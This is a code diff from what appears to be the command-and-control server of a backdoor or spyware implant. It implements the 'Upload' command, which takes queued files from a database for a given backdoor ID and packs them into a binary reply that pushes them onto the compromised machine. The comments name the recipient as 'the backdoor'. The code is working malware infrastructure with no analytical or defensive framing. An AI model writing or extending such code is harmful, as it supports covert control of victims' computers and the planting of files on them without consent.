@@ -124,9 +124,30 @@ module Commands
   def command_upload(peer, session, message)
     trace :info, "[#{peer}][#{session[:cookie]}] Upload request"
 
-    #TODO: implement
+    # the upload list was already retrieved (if any) during the ident phase
+    # here we get just the content (locally) without asking again to the db
+    # the database will output one upload at a time and the 'left' number of file
+    # we pass it to the backdoor which will request again if left is greater than zero
+    upload, left = DB.instance.new_uploads session[:bid]
 
-    #TODO: create fake log upload
+    # send the response
+    if upload.nil? then
+      trace :info, "[#{peer}][#{session[:cookie]}] NO uploads"
+      response = [PROTO_NO].pack('i')
+    else
+      response = [PROTO_OK].pack('i')
+
+      content = [left].pack('i')                     # number of uploads still waiting in the db
+      content += upload[:filename].pascalize         # filename
+      content += [upload[:content].length].pack('i') # file size
+      content += upload[:content]                    # file content
+
+      response += [content.length].pack('i') + content
+
+      trace :info, "[#{peer}][#{session[:cookie]}] upload sent (#{left} left)"
+    end
+
+    return response
   end
 
   # Protocol Download
